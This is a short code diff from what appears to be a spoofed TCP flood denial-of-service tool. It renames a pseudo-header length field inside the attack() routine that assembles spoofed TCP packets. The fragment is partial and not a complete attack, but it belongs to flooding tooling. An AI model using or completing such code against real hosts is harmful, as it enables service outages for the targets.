@@ -80,7 +80,7 @@ void Spoofed_TCP_Flood::attack(const int *id) {
             psh.dest_address = dst.sin_addr.s_addr;
             psh.placeholder = 0;
             psh.protocol = IPPROTO_TCP;
-            psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(buf));
+            psh.length = htons(sizeof(struct tcphdr) + strlen(buf));
 
             int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(buf);
             pseudogram = static_cast<char *>(malloc(static_cast<size_t>(psize)));
